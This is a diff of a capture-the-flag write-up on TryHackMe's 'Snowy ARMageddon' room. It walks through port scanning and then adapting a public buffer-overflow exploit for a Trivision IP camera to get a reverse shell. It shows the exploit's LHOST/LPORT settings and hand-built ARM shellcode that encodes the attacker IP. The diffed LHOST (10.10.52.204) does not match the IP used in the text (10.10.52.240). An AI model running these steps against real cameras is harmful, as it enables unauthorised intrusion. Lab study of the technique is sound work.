@@ -10,9 +10,9 @@
 
 [PROCEDURE](#procedure)
 
--  [Part 1 - Retrieving the WiFi SSID](#part-1---retrieving-the-wifi-ssid)
+-  [Part 1 - Port Scanning and Enumeration](#part-1---port-scanning-and-enumeration)
     
--  [Part 2 - Retrieving the WiFi Password](#part-2---retrieving-the-wifi-password)
+-  [Part 2 - Modifying Assembly Code and Obtaining Reverse Shell](#part-2---retrieving-the-wifi-password)
     
 -  [Part 3 - Decrypting and Analysing WiFi Traffic](#part-3---decrypting-and-analysing-wifi-traffic)
     
@@ -41,6 +41,8 @@ This room was included as one of the sidequests for the TryHackMe Advent of Cybe
 
 
 ## Procedure ##
+
+# Part 1 - Port Scanning and Enumeration #
 
 Start with a `nmap` scan with the `-sS` switch and go have a coffee while it runs.
 The `-sS` switch asks `nmap` to perform a `SYN Stealth scan` which is a relatively stealthy (remember that we are told that stealth is important in this challenge) and quick scan.  A `SYN Stealth scan` never opens a full TCP connection and instead relies on sending  `SYN` packets and waiting for a `SYN/ACK` or `RST` responses.
@@ -74,27 +76,30 @@ This leaves us with port `8080` and we can just open a browser and navigate to `
 
 ![Angry looking elf](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/5bd4056d-ed64-4416-9d99-a81154c8fa3e)
 
-
-This must be the **"internal-only web application"** that is our main target.  But as the name implies - it's only accessible from the internal network, so we need to figure out a way in first.
+This must be the **"internal-only web application"** that is our main target.  But as the name implies - it appears to only be accessible from the internal network, so we need to figure out a way in first.
 
 Let's have a look at port `50628` next - maybe we can access it through the browser too by navigating to `http://10.10.106.239:50628` ?  Yup, it brings up a login page for a **Trivision NC-227WF HD 720P** IP Network camera:
 
-![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/13c1fc4f-a870-44b9-80a0-f95748667583)
+![Trivision Dashboard](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/13c1fc4f-a870-44b9-80a0-f95748667583)
+
+
+# Part 2 - Modifying Assembly Code and Obtaining Reverse Shell #
 
 Some Google searching for `Trivision NC-227WF Exploit` quickly leads us to the following article: [(https://no-sec.net/arm-x-challenge-breaking-the-webs/)](https://no-sec.net/arm-x-challenge-breaking-the-webs/) and just by looking at the title it is evident that we're dealing with an ARM processor architecture (and the `ARMageddon` in the challenge title is making more sense now).
+
 The article explains how a buffer overflow vulnerability in the Trivision camera firmware can be exploited to establish a reverse shell connection.  It conveniently also provides [assembly code instructions](code/Snowy_ARMageddon/original_assembly_instructions.asm) and a [python script](code/Snowy_ARMageddon/original_exploit.py) to exploit this.
 
 The Python code includes the `HOST`, `LHOST` variables that need to be updated with the Camera IP address and Localhost IP address respectively. 
 ```
 HOST = '10.10.106.239'
 PORT = 50628
-LHOST = [10,10,233,1]
+LHOST = [10,10,52,204]
 LPORT = 4444
 ```
 
-The code then declares a variable called `BADCHARS` - tis contains the hex values that we cannot pass on to the device.... these will come into play in a short while...
+The code then declares a variable called `BADCHARS` - this contains a set of hex values that we cannot pass on to the device.... these will come into play in a short while...
 ```
-BADCHARS = b'\x00\x09\x0a\x0d\x20\x23\x26'
+BADCHARS = b'\x00\x09\x0a\x0d\x20\x23\x26'  # Equivalent to decimal values: 0, 9, 10, 13, 32, 35 and 38 
 ```
 
 There is also a line towards the end of the script that needs to be updated with the IP Camera's address:
@@ -116,20 +121,20 @@ add r1, #0xc0
 push {r1}       // 192.168.100.1
 ```
 
-If you're reading this and are anything like myself - you probably just experienced an involuntary inner *groan* at the site of assembly code...  but please stay with me for a while longer and I hope to demystify this code block for you.
+If you're reading this and are anything like myself - you probably just experienced an involuntary inner *groan* at the site of assembly code 😞...  but please stay with me for a while longer and I hope to demystify this code block for you.
 
-First of all, we can use a Dis/Assembler like https://shell-storm.org/online/Online-Assembler-and-Disassembler/ to convert between assembly instructions and the equivalent hex values that represent it.  This tool will come in useful as we work out how to replace the hex byte string with one containing our local machine's IP address.  It is also worth keeping in mind that ARM uses a little-endian system which essentially means that the octets of the IP address are stored in reverse order, eg. `1.100.168.192`.
+First of all, we can use a Dis/Assembler like https://shell-storm.org/online/Online-Assembler-and-Disassembler/ to convert between assembly instructions and the equivalent hex values that represent it.  This tool will come in useful as we work out how to replace the hex byte string with one containing our local machine's IP address.  It is also worth keeping in mind that ARM uses a little-endian system which essentially means that the octets of the IP address are stored in reverse order, eg. `192.168.100.1` is stored as `1.100.168.192`.
 
 So what's going on with the assembly instructions storing the IP address value of `192.168.100.1`?:
--  Move 0x164 to register R1 (i.e. 356 in decimal)
--  Shift the register left by eight bits (i.e. perform 356 x 256 = 91136)
--  Add 0xA8 to R1 (i.e. perform 91136 + 168 = 91304)
--  Shift the register left by eight bits (i.e. perform 91304 x 256 = 23373824)
--  Add 0xC0 to R1 (i.e. perform 23373824 + 192 = **23374016**)
+-  Move 0x164 to register R1 (i.e. $356$ in decimal)
+-  Shift the register left by eight bits (i.e. perform $356 * 256 = 91136$)
+-  Add 0xA8 to R1 (i.e. perform $91136 + 168 = 91304$)
+-  Shift the register left by eight bits (i.e. perform $91304 * 256 = 23373824$)
+-  Add 0xC0 to R1 (i.e. perform $23373824 + 192 = 23374016$)
 
-So now we have value of `23374016` (decimal) stored in register R1.  If we convert this to a 32-bit binary and divide into octets (i.e. groups of 8 bits each) we get: **`00000001.01100100.10101000.11000000`**, and if we convert this back to decimal we will get: **`1.100.168.192`** - which is the little-endian representation of the IP address we were looking to store.
+So now we have value of **`23374016`** (decimal) stored in register R1.  If we convert this to a 32-bit binary and divide it into octets (i.e. groups of 8 bits each) we get: **`00000001.01100100.10101000.11000000`**, and if we convert this back to decimal we will get: **`1.100.168.192`** - which is the little-endian representation of the IP address we were looking to store.
 
-If you've managed to follow my reasoning this far, it should be clear that we are taking the little-endian representation of the IP address, converting it to decimal and then storing appropriate hex values to register R1 to represent this.  In our case this is complicated a bit further by the fact that we have to avoid the hex values defined in the `BADCHARS` variable.
+If you've managed to follow my reasoning this far, it should be clear that we are taking the little-endian representation of the IP address, converting it to decimal and then storing appropriate hex values to register R1 and shifting by 8 bits to the left for each octet to represent this.  In our case this is complicated a bit further by the fact that we have to avoid the hex values defined in the `BADCHARS` variable which include the hex equiavelent value for `10` and - of course- TryHackMe Attackboxes always have an IP address starting with `10.10`!
 
 Now that we've understood how this works, we can craft our own hex byte string that points back to our local machine IP address - in our case this will be `10.10.52.240`.
 
@@ -139,15 +144,15 @@ mov r1, #0xf0   // store '240' in R1
 lsl r1, #8      // shift by 8 bits to the left
 add r1, #0x34   // add '52' to R1
 lsl r1, #8      // shift by 8 bits to the left
-add r1, #0x08   // add '8' and '2' to R1 (since we cannot pass the hex value for 10; '0x0a'
+add r1, #0x08   // add '8' and '2' to R1 (since we cannot pass the hex value for 10; '0x0a')
 add r1, #0x02
 lsl r1, #8      // shift by 8 bits to the left
-add r1, #0x08   // add '8' and '2' to R1 (since we cannot pass the hex value for 10; '0x0a'
+add r1, #0x08   // add '8' and '2' to R1 (since we cannot pass the hex value for 10; '0x0a')
 add r1, #0x02
 push {r1}       
 ```
-Now we can simply copy this set of instructions to the assembler and convert it to a hex string we can paste into the Python Script:
-
+Now we can simply copy this set of instructions to the assembler and convert it to a hex string that we can paste into the Python Script:
+_(Make sure to select `ARM` for the processor type and to copy the Little Endian output)_
 ![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/e90c2569-f13d-42d5-8eb3-3b0ecacc003c)
 
 You can follow [THIS LINK](https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=mov+r1%2C+%230xf0++%0D%0Alsl+r1%2C+%238++++%0D%0Aadd+r1%2C+%230x34+++%0D%0Alsl+r1%2C+%238++++++%0D%0Aadd+r1%2C+%230x08+++%0D%0Aadd+r1%2C+%230x02%0D%0Alsl+r1%2C+%238++++++%0D%0Aadd+r1%2C+%230x08+++%0D%0Aadd+r1%2C+%230x02++++%0D%0Apush+%7Br1%7D++&arch=arm&as_format=inline#assembly) and simply change the `#0xf0` and `#0x34` values to correspond to your IP address - but remember to avoid using any *bad characters*!
